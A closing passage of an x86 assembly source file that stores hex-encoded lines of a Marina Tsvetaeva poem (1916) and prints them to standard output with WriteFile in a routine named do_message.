        db      73h, 65h, 0ah, 0dh
        db      57h, 68h, 6fh, 27h
        db      76h, 65h, 20h, 77h
        db      69h, 74h, 6eh, 65h
        db      73h, 73h, 65h, 64h
        db      20h, 79h, 6fh, 75h
        db      20h, 64h, 69h, 73h
        db      61h, 70h, 70h, 65h
        db      61h, 72h, 2eh, 2eh
        db      2eh, 0ah, 0dh, 49h
        db      27h, 6dh, 20h, 6bh
        db      69h, 73h, 73h, 69h
        db      6eh, 67h, 20h, 79h
        db      6fh, 75h, 20h, 6eh
        db      6fh, 77h, 20h, 2dh
        db      20h, 61h, 63h, 72h
        db      6fh, 73h, 73h, 0ah
        db      0dh, 54h, 68h, 65h
        db      20h, 67h, 61h, 70h
        db      20h, 6fh, 66h, 20h
        db      61h, 20h, 74h, 68h
        db      6fh, 75h, 73h, 61h
        db      6eh, 64h, 20h, 79h
        db      65h, 61h, 72h, 73h
        db      2eh, 0ah, 0dh
        db      "Marina Tsvetaeva (1916)"

text_end        label    near
        pop     ecx
        push    0
        push    0
        push    offset text_end - offset text_begin
                                             ;eventful :)
        push    ecx
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        ret
do_message      endp
end     code_begin